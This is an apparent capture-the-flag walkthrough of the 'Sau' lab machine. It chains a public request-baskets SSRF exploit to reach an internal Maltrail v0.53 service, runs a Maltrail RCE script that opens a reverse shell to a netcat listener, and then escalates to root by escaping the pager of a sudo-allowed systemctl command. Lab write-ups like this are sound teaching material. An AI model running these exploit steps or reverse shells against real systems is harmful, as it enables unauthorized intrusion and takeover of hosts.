# Sau

## Information Gathering

## Enumeration

Running an nmap scan
```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 07 Oct 2023 18:57:44 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sat, 07 Oct 2023 18:57:18 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sat, 07 Oct 2023 18:57:18 GMT
|_    Content-Length: 0
```


### 55555/tcp

Software:
- request-baskets v1.2.1
    - [Request-Baskets v1.2.1 SSRF](https://www.exploit-db.com/exploits/51675)
- Maltrail v0.53
    - [Maltrail v0.53 RCE](https://www.exploit-db.com/exploits/51676)

## Foothold

Navigating to `http://10.10.11.224:55555/web` reveals an application `request-baskets`. There is a [publicly disclosed vulnerability / exploit](https://www.exploit-db.com/exploits/51675) in this version of `request-baskets`. 

This exploit will allow us to create a proxy on the target host. The host will then forward the request to the host we specified. Where to forward the request to? There are two ports (80 and 8338) which we are unable to connect to. My guess is there is host filtering preventing us from connecting to these ports and only `localhost` will be able to connect. Create a proxy on the target host and forward a request to `http://127.0.0.1:8338`:

```bash
$ ./request_basket_ssrf.sh "http://10.10.11.224:55555" "http://127.0.0.1:8338"
> Creating the "dxinaj" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/dxinaj now makes the server request to http://127.0.0.1:8338.
> Authorization: O2yUA8ueNh7hHsDPJrj2RfSJzpsfvxvquQE6w3StdPXg

$ curl -s "http://10.10.11.224:55555/dxinaj" | html2text
[images/mlogo.png]altrail
                             [images/calendar.png]
    * Documentation
    * |
    * Wiki
    * |
    * Issues
    * |
    * Log In

    * *** - ***
      * Threats *
    * *** - ***
      * Events *
    * *** - ***
      * Severity *
    * *** - ***
      * Sources *
    * *** - ***
      * Trails *
 [images/close.png]
Javascript is disabled in your browser. You must have Javascript enabled to
utilize the functionality of this page.
Powered by Maltrail (v0.53)
    * Hide threat
    * Report false positive
```

We were able to send a request to an internal application. The internal app running on 8338 is `Maltrail v0.53`. There is also a [publicly disclosed vulnerability / exploit](https://www.exploit-db.com/exploits/51676) for this vulnerability as well. We can send the payload to the proxy, which'll in-turn forward the payload to the vulnerable application:

```bash
$ ./maltrail_rce.py 10.10.14.25 9001 http://10.10.11.224:55555/dxinaj
Running exploit on http://10.10.11.224:55555/dxinaj/login
```

Running the above while also running a netcat listener catches the reverse shell as `puma`.

```bash
$ nc -lnvp 9001                  
listening on [any] 9001 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.224] 57770
$ id
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
```

## Privilege Escalation

Running `sudo -l` allows us to see what commands we can run root as:

```bash
$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

According to [gtfobins/systemctl](https://gtfobins.github.io/gtfobins/systemctl/#sudo) when running `systemctl`, we get dropped into a default pager (likely to be `less`). Inputting `!sh` gets the root shell.

```bash
$ sudo /usr/bin/systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
...<snip>...
Oct 07 15:25:38 sau systemd[1]: Started Maltrail. Server of malicious traffic detection system.
Oct 07 23:30:47 sau crontab[5051]: (puma) LIST (puma)
Oct 07 23:30:51 sau sudo[7401]:     puma : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=list
Oct 07 23:30:51 sau nologin[7450]: Attempted login by UNKNOWN (UID: 1001) on UNKNOWN
Oct 07 23:34:34 sau sudo[15060]: pam_unix(sudo:auth): authentication failure; logname= uid=1001 euid=0 tty=/dev/pts/2 ruser=puma rhost=  user=puma
Oct 07 23:34:46 sau sudo[15062]:     puma : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/systemctl status trail.service
Oct 07 23:34:46 sau sudo[15062]: pam_unix(sudo:session): session opened for user root by (uid=0)
Oct 08 01:50:06 sau sudo[15161]:     puma : TTY=pts/4 ; PWD=/opt/maltrail ; USER=root ; COMMAND=/usr/bin/systemctl status trail.service
Oct 08 01:50:06 sau sudo[15161]: pam_unix(sudo:session): session opened for user root by (uid=0)
!sh
# id
uid=0(root) gid=0(root) groups=0(root)
```